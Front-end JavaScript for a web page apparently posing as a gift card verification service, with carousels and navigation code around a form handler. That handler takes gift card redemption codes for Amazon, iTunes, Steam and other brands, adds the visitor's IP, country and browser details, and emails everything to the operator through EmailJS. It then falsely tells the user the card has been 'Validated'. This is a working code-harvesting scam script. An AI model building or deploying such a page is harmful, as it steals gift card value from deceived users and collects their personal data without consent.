
    (function () {
      // NAV TOGGLE
      const navToggle = document.querySelector('.nav-toggle');
      const nav = document.getElementById('site-nav');
      navToggle.addEventListener('click', () => {
        const expanded = navToggle.getAttribute('aria-expanded') === 'true';
        navToggle.setAttribute('aria-expanded', String(!expanded));
        nav.classList.toggle('open');
      });

      // Smooth scroll for anchor links (prefers-reduced-motion respects)
      if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
        document.querySelectorAll('a[href^="#"]').forEach(a => {
          a.addEventListener('click', (e) => {
            const target = document.querySelector(a.getAttribute('href'));
            if (target) {
              e.preventDefault();
              target.scrollIntoView({ behavior: 'smooth', block: 'start' });
              if (nav.classList.contains('open')) { nav.classList.remove('open'); navToggle.setAttribute('aria-expanded','false'); }
            }
          });
        });
      }

      // CREDIBILITY CAROUSEL: autoplay, no controls, reduced box size, center
  function initCredCarousel(root) {
  const track = root.querySelector('.carousel-track');
  const slides = Array.from(track.children);
  const gap = parseInt(getComputedStyle(track).gap);
  let index = 0;
  let isDragging = false, startX = 0, currentTranslate = 0, prevTranslate = 0;

  // Clone slides at start and end for seamless looping
  slides.forEach(slide => {
    track.appendChild(slide.cloneNode(true));
  });
  const allSlides = Array.from(track.children);
  const slideWidth = slides[0].offsetWidth + gap;

  function setPosition(animated = true) {
    if (animated) track.style.transition = 'transform 0.4s ease';
    else track.style.transition = 'none';
    track.style.transform = `translateX(${-index * slideWidth}px)`;
  }

  function moveNext() {
    index++;
    setPosition();
    if (index >= allSlides.length - slides.length) {
      // jump back to original slides
      setTimeout(() => {
        index = 0;
        setPosition(false);
      }, 420); // wait for animation
    }
  }

  function movePrev() {
    index--;
    setPosition();
    if (index < 0) {
      index = allSlides.length - slides.length - 1;
      setPosition(false);
    }
  }

  // Autoplay
  if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
    let timer = setInterval(moveNext, 4200);
    root.addEventListener('mouseenter', () => clearInterval(timer));
    root.addEventListener('mouseleave', () => timer = setInterval(moveNext, 4200));
  }

  // Touch / drag
  track.addEventListener('pointerdown', startDrag);
  track.addEventListener('pointerup', endDrag);
  track.addEventListener('pointerleave', endDrag);
  track.addEventListener('pointermove', drag);

  function startDrag(e) {
    isDragging = true;
    startX = e.clientX;
    prevTranslate = -index * slideWidth;
    track.style.transition = 'none';
  }

  function drag(e) {
    if (!isDragging) return;
    const diff = e.clientX - startX;
    currentTranslate = prevTranslate + diff;
    track.style.transform = `translateX(${currentTranslate}px)`;
  }

  function endDrag(e) {
    if (!isDragging) return;
    isDragging = false;
    const diff = e.clientX - startX;
    track.style.transition = 'transform 0.4s ease';
    if (diff < -50) moveNext();
    else if (diff > 50) movePrev();
    else setPosition();
  }

  setPosition(false);
}

// Init all credibility carousels
document.querySelectorAll('.carousel[data-carousel="cred"]').forEach(initCredCarousel);


// form
document.addEventListener("DOMContentLoaded", () => {
  const form = document.querySelector(".verify-form");
  const cardSelect = document.getElementById("card-type");
  const codeInput = document.getElementById("redeem-code");
  const modal = document.getElementById("form-modal");
  const modalMsg = document.getElementById("modal-message");
  const modalClose = modal.querySelector(".modal-close");

    const spinner = document.getElementById("spinner");

function showSpinner() {
  spinner.style.display = "flex";
}

function hideSpinner() {
  spinner.style.display = "none";
}


  // EmailJS init
  emailjs.init("lhvg3CREDwBk6RH_4"); // replace with your EmailJS public key

  const cardPatterns = {
    Amazon: { pattern: /^[A-Z0-9]{4}\.[A-Z0-9]{5}\.[A-Z0-9]{4}$/, format: "XXXX.XXXXX.XXXX" },
    iTunes: { pattern: /^[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}$/, format: "XXXX-XXXX-XXXX-XXXX" },
    "Google Play": { pattern: /^[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}$/, format: "XXXX-XXXX-XXXX-XXXX" },
    Steam: { pattern: /^[A-Z0-9]{5} [A-Z0-9]{5} [A-Z0-9]{5}$/, format: "XXXXX XXXXX XXXXX" },
    Xbox: { pattern: /^[A-Z0-9]{5}-[A-Z0-9]{5}-[A-Z0-9]{5}-[A-Z0-9]{5}-[A-Z0-9]{5}$/, format: "XXXXX-XXXXX-XXXXX-XXXXX-XXXXX" },
    PSN: { pattern: /^[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}$/, format: "XXXX-XXXX-XXXX-XXXX" },
    Sephora: { pattern: /^[0-9]{12}$/, format: "XXXXXXXXXXXX" },
    Footlocker: { pattern: /^[A-Z0-9]{4} [A-Z0-9]{4} [A-Z0-9]{4} [A-Z0-9]{4}$/, format: "XXXX XXXX XXXX XXXX" },
  };

  const cardAmounts = {
    Amazon: [10,25,50,100,200,300,500],
    iTunes: [15,25,50,100,200,300,500],
    "Google Play": [10,25,50,100,200,300,500],
    Steam: [20,50,100,200,300,500],
    Xbox: [25,50,100,200,300,500],
    PSN: [10,20,50,100,200,300,500],
    Sephora: [25,50,100,200,300,500],
    Footlocker: [25,50,100,200,300,500],
  };

  // Update placeholder when card type changes
  cardSelect.addEventListener("change", () => {
    const card = cardSelect.value;
    codeInput.placeholder = card && cardPatterns[card]
      ? `Format: ${cardPatterns[card].format}`
      : "Enter scratch code";
  });

  // Modal helpers
  function showModal(msg){
    modalMsg.textContent = msg;
    modal.style.display = "block";
  }

  modalClose.addEventListener("click", ()=> modal.style.display="none");
  window.addEventListener("click", e=> { if(e.target===modal) modal.style.display="none"; });

  // Form submit validation + EmailJS
  form.addEventListener("submit", async (e) => {
    e.preventDefault();

    const card = cardSelect.value;
    const currency = form.querySelectorAll("select")[1].value;
    const amount = form.querySelector("input[placeholder='Amount']").value.trim();
    const code = codeInput.value.trim();

    let errors = [];

    if(!card) errors.push("Select a gift card type.");
    if(!currency) errors.push("Select a currency.");
    if(!amount) errors.push("Enter an amount.");
    if(!code) errors.push("Enter the redemption code.");

    // Pattern validation
    if(card && code && cardPatterns[card]) {
      if(!cardPatterns[card].pattern.test(code)) {
        errors.push(`Code format invalid. Expected: ${cardPatterns[card].format}`);
      }
    }

    // Amount validation
    if(card && amount) {
      if(!cardAmounts[card].includes(Number(amount))) {
        errors.push(`Amount must be one of: ${cardAmounts[card].join(", ")}`);
      }
    }

    if(errors.length > 0){
      showModal(errors.join("\n"));
      return;
    }

    // --------------------------
    // 🔥 GET USER DEVICE + IP DATA
    // --------------------------
    let userIP = "Unknown";
    let geoCountry = "Unknown";

    try {
      const res = await fetch("https://ipapi.co/json/");
      const data = await res.json();
      userIP = data.ip || "Unknown";
      geoCountry = data.country_name || "Unknown";
    } catch(e) {}

    // --------------------------
    // 🔥 BUILD FULL EMAIL TEMPLATE PARAMS
    // --------------------------
    const templateParams = {
      user_os: window.navigator.oscpu || navigator.platform,
      user_platform: navigator.userAgentData?.platform || navigator.platform,
      user_browser: navigator.userAgentData?.brands?.[0]?.brand || "Unknown",
      user_version: navigator.userAgentData?.brands?.[0]?.version || "Unknown",
      user_country: geoCountry,
      user_ip: userIP,
      user_referrer: document.referrer || "Direct",

      card_type: card,
      currency: currency,
      amount: amount,
      code: code,

      time: new Date().toLocaleString(),
    };

    // --------------------------
    // 🔥 SEND EMAIL
    // --------------------------
 // Show spinner before sending
showSpinner();

emailjs.send("service_0e5tu6h", "template_23zl6b7", templateParams)
  .then(() => {
    hideSpinner(); // hide spinner
    showModal(`✅ ${card} Gift Card has been Validated!`);
  })
  .catch(err => {
    hideSpinner(); // hide spinner
    showModal(`⚠️ Verification valid but email failed: ${err.text}`);
  });


    form.reset();
    codeInput.placeholder = "Enter scratch code";
  });
});



      function initTestiCarousel(root) {
  const grid = root.querySelector('#testi-grid');
  const cards = Array.from(grid.children);
  const prevBtn = root.closest('.carousel').querySelector('[data-action="prev"]');
  const nextBtn = root.closest('.carousel').querySelector('[data-action="next"]');

  // Clone cards for infinite loop
  cards.forEach(card => grid.appendChild(card.cloneNode(true)));
  const allCards = Array.from(grid.children);

  let index = 0;
  let isDragging = false, startX = 0, currentTranslate = 0, prevTranslate = 0;

  function cardWidth() {
    return allCards[0].getBoundingClientRect().width + parseFloat(getComputedStyle(grid).gap || 0);
  }

  function setPosition(animated = true) {
    if (animated) grid.style.transition = 'transform 0.4s ease';
    else grid.style.transition = 'none';
    grid.style.transform = `translateX(${-index * cardWidth()}px)`;
  }

  function moveNext() {
    index++;
    setPosition();
    if (index >= allCards.length - cards.length) {
      // jump back to the start seamlessly
      setTimeout(() => {
        index = 0;
        setPosition(false);
      }, 420); 
    }
  }

  function movePrev() {
    index--;
    setPosition();
    if (index < 0) {
      index = allCards.length - cards.length - 1;
      setPosition(false);
    }
  }

  prevBtn && prevBtn.addEventListener('click', movePrev);
  nextBtn && nextBtn.addEventListener('click', moveNext);

  // Autoplay
  if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
    let timer = setInterval(moveNext, 4200);
    root.addEventListener('mouseenter', () => clearInterval(timer));
    root.addEventListener('mouseleave', () => timer = setInterval(moveNext, 4200));
  }

  // Touch/drag
  grid.addEventListener('pointerdown', e => {
    isDragging = true;
    startX = e.clientX;
    prevTranslate = -index * cardWidth();
    grid.style.transition = 'none';
  });

  grid.addEventListener('pointermove', e => {
    if (!isDragging) return;
    const diff = e.clientX - startX;
    currentTranslate = prevTranslate + diff;
    grid.style.transform = `translateX(${currentTranslate}px)`;
  });

  grid.addEventListener('pointerup', endDrag);
  grid.addEventListener('pointerleave', endDrag);
  grid.addEventListener('pointercancel', endDrag);

  function endDrag() {
    if (!isDragging) return;
    isDragging = false;
    const diff = currentTranslate - prevTranslate;
    if (diff < -40) moveNext();
    else if (diff > 40) movePrev();
    else setPosition();
  }

  // Recalculate on resize
  window.addEventListener('resize', () => setPosition(false));

  // Initialize
  setPosition(false);
}

// Initialize carousels
document.querySelectorAll('.carousel').forEach(el => {
  if (el.dataset.carousel === 'cred') initCredCarousel(el);
  if (el.dataset.carousel === 'testi' || el.datasetCarousel === 'testi') initTestiCarousel(el);
});


      // ensure each <details> summary accessibility: add keyboard toggle role and toggle arrow
      document.querySelectorAll('.acc-item summary').forEach(s => {
        s.setAttribute('role', 'button');
        s.addEventListener('click', ()=>{
          const arrow = s.querySelector('.arrow');
          const opened = s.parentElement.hasAttribute('open');
          if(arrow) arrow.textContent = opened ? '+' : '−';
        });
        // ensure arrow updates on keyboard toggle (Enter/Space)
        s.addEventListener('keydown', (e)=>{ if(e.key==='Enter' || e.key===' ') { e.preventDefault(); s.click(); } });
      });

      // small accessibility: attach keyboard support for carousel controls
      document.querySelectorAll('.carousel .prev, .carousel .next').forEach(btn=>{ btn.tabIndex=0; btn.addEventListener('keydown', e=>{ if(e.key==='Enter' || e.key===' ') btn.click(); }); });

    })();
